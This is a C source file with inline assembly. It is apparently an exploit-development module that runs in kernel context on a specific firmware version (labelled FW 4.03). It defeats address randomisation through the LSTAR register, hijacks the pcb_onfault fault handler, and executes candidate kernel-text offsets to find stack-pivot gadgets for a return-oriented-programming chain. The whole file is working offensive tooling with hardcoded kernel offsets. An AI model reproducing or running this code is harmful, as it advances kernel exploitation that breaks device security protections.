#include <stdint.h>

/*
 * pivot_scan_safe — ktext pivot gadget scanner with pcb_onfault fault recovery
 *
 * Scans ktext for stack pivot gadgets (xchg rsp,rax; ret etc.) by executing
 * each candidate byte offset. Uses pcb_onfault (PCB+0x108, confirmed) to
 * recover from page faults instead of killing the thread.
 *
 * Strategy: For each candidate, set pcb_onfault to a recovery label, set
 * RAX = &pivot_chain, call candidate via ROP. Three outcomes:
 *   1. Normal return → candidate didn't pivot, survived (continue)
 *   2. Pivot detected → RSP redirected to pivot_chain (report + stop)
 *   3. Page fault → pcb_onfault recovery fires (continue)
 *
 * Configure scan range via fw_ver:
 *   High 16 bits = start offset index (each unit = 1 byte from scan_base)
 *   Low 16 bits = count (0 = default 256)
 *
 * Default scan_base: first apic_ops entry - 16 (scan epilogue bytes)
 *
 * Output layout (uint64_t indices):
 *   [0]   magic "PVSF" (0x50565346) | status(32)
 *   [1]   kdata_base
 *   [2]   ktext_base
 *   [3]   td_pcb
 *   [4]   scan_start address
 *   [5]   scan_count
 *   [6]   num_tested
 *   [7]   num_survived (returned without fault or pivot)
 *   [8]   num_faulted (recovered via pcb_onfault)
 *   [9]   num_pivots (RSP redirected)
 *   [10]  first pivot ktext-relative offset (0 if none)
 *   [11]  first pivot absolute address (0 if none)
 *   [12]  last_tested_index (for resume on thread death)
 *   [13..44] pivot details: up to 8 pivots × 4 qwords each
 *            [13+i*4+0] ktext offset
 *            [13+i*4+1] absolute address
 *            [13+i*4+2] entry_stk RSP snapshot (for diagnosing pop count)
 *            [13+i*4+3] reserved
 *   [63]  sentinel 0xdeadbeefcafe0021
 */

#define MAGIC_PVSF    0x50565346  /* "PVSF" */
#define TD_PCB        0x3f8
#define PCB_ONFAULT   0x108

/* FW 4.03 offsets */
#define OFF_NOP_RET       (-0x9d20ca)    /* nop; ret gadget from kdata_base */
#define APIC_OPS_OFF_KTEXT 0x1934AC8

#define ENTRY_STK_SIZE    32
#define MAX_PIVOTS        8

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

/* Shared state between C and asm */
static volatile uint64_t saved_rsp;
static volatile uint64_t onfault_addr;    /* pcb + PCB_ONFAULT */
static volatile int probe_result;         /* 0=normal, 1=pivot, 2=fault */

/* Pivot chain: where RSP goes if candidate pivots */
static volatile uint64_t pivot_chain[8];

/* Entry stack: [candidate, resume, resume, ...] */
static volatile uint64_t entry_stk[ENTRY_STK_SIZE];

/* Naked pivot landing — reached when RSP was redirected to pivot_chain */
__attribute__((naked, used))
static void pivot_landing(void)
{
    __asm__ volatile(
        "movq $1, probe_result(%%rip)\n\t"     /* pivot detected */
        "movq saved_rsp(%%rip), %%rsp\n\t"
        "movq onfault_addr(%%rip), %%r14\n\t"
        "movq $0, (%%r14)\n\t"                  /* clear pcb_onfault */
        "jmp .Lprobe_done\n\t"
        ::: "memory"
    );
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t fw_ver = args->fw_ver;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    /* Zero output */
    for (int i = 0; i < 64; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t nop_ret = kdata_base + OFF_NOP_RET;

    /* Get curthread → td_pcb */
    uint64_t curthread;
    __asm__ volatile("movq %%gs:0, %0" : "=r"(curthread));
    uint64_t td_pcb = read8(curthread + TD_PCB);

    if (!td_pcb) {
        out32[0] = MAGIC_PVSF;
        out32[1] = 0xFF;  /* error */
        out[63] = 0xdeadbeefcafe0021ULL;
        return 0;
    }

    onfault_addr = td_pcb + PCB_ONFAULT;

    /* Parse scan parameters from fw_ver */
    uint32_t start_idx = (fw_ver >> 16) & 0xFFFF;
    uint32_t count = fw_ver & 0xFFFF;
    if (count == 0) count = 256;
    if (count > 4096) count = 4096;

    /* Default scan base: first apic_ops entry - 16 (epilogue bytes) */
    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
    uint64_t first_apic_func = read8(apic_ops_addr);  /* apic_ops[0] */
    uint64_t scan_base = first_apic_func - 16;

    uint64_t scan_start = scan_base + start_idx;

    /* Header */
    out32[0] = MAGIC_PVSF;
    out32[1] = 0xAAAA;  /* in-progress */
    out[1] = kdata_base;
    out[2] = ktext_base;
    out[3] = td_pcb;
    out[4] = scan_start;
    out[5] = count;

    /* Set up pivot chain */
    pivot_chain[0] = nop_ret;
    pivot_chain[1] = nop_ret;
    pivot_chain[2] = (uint64_t)pivot_landing;
    pivot_chain[3] = nop_ret;
    pivot_chain[4] = nop_ret;
    pivot_chain[5] = nop_ret;
    pivot_chain[6] = nop_ret;
    pivot_chain[7] = nop_ret;

    uint32_t num_tested = 0;
    uint32_t num_survived = 0;
    uint32_t num_faulted = 0;
    uint32_t num_pivots = 0;

    for (uint32_t i = 0; i < count; i++) {
        uint64_t candidate = scan_start + i;

        /* Record progress before attempting (survives thread death) */
        out[6] = num_tested + 1;
        out[12] = i;

        /* Set up entry stack: candidate first, then resume addresses */
        entry_stk[0] = candidate;

        probe_result = 0;

        /*
         * The probe:
         * 1. Arm pcb_onfault with recovery label
         * 2. Save RSP
         * 3. Set RAX = pivot_chain (pivot target)
         * 4. Switch to entry_stk and retq → candidate
         * 5. Three outcomes:
         *    - Normal return → label 1
         *    - Pivot → pivot_landing (naked function)
         *    - Fault → pcb_onfault → label 2
         */
        __asm__ volatile(
            /* Fill entry_stk[1..31] with normal resume address */
            "leaq entry_stk(%%rip), %%rdx\n\t"
            "leaq 1f(%%rip), %%rcx\n\t"
            ".set j, 1\n\t"
            ".rept 31\n\t"
            "movq %%rcx, (j*8)(%%rdx)\n\t"
            ".set j, j+1\n\t"
            ".endr\n\t"

            /* Arm pcb_onfault with fault recovery label */
            "movq onfault_addr(%%rip), %%r14\n\t"
            "leaq 2f(%%rip), %%rcx\n\t"
            "movq %%rcx, (%%r14)\n\t"         /* pcb[0x108] = recovery */

            /* Save RSP */
            "movq %%rsp, saved_rsp(%%rip)\n\t"

            /* RAX = pivot_chain (where RSP goes if pivot works) */
            "leaq pivot_chain(%%rip), %%rax\n\t"

            /* Switch RSP to entry stack and go */
            "leaq entry_stk(%%rip), %%rsp\n\t"
            "retq\n\t"

            /* Label 1: Normal return — candidate returned without pivoting */
            "1:\n\t"
            "movq saved_rsp(%%rip), %%rsp\n\t"
            "movq onfault_addr(%%rip), %%r14\n\t"
            "movq $0, (%%r14)\n\t"             /* clear pcb_onfault */
            "jmp .Lprobe_done\n\t"

            /* Label 2: Fault recovery — pcb_onfault fired */
            "2:\n\t"
            "movq saved_rsp(%%rip), %%rsp\n\t"
            "movq onfault_addr(%%rip), %%r14\n\t"
            "movq $0, (%%r14)\n\t"             /* clear pcb_onfault */
            "movl $2, probe_result(%%rip)\n\t"  /* mark as fault */

            ".globl .Lprobe_done\n\t"
            ".Lprobe_done:\n\t"
            :
            :
            : "rax", "rbx", "rcx", "rdx", "rsi", "rdi",
              "r8", "r9", "r10", "r11", "r14", "r15",
              "memory", "cc"
        );

        num_tested++;

        if (probe_result == 1) {
            /* PIVOT FOUND */
            if (num_pivots < MAX_PIVOTS) {
                out[13 + num_pivots * 4 + 0] = candidate - ktext_base;
                out[13 + num_pivots * 4 + 1] = candidate;
                out[13 + num_pivots * 4 + 2] = 0;  /* reserved */
                out[13 + num_pivots * 4 + 3] = 0;
            }
            if (num_pivots == 0) {
                out[10] = candidate - ktext_base;
                out[11] = candidate;
            }
            num_pivots++;
        } else if (probe_result == 2) {
            num_faulted++;
        } else {
            num_survived++;
        }
    }

    /* Final stats */
    out[6] = num_tested;
    out[7] = num_survived;
    out[8] = num_faulted;
    out[9] = num_pivots;

    out32[1] = (num_pivots > 0) ? 0x0002 : 0x0001;  /* PIVOT or DONE */

    out[63] = 0xdeadbeefcafe0021ULL;
    return 0;
}
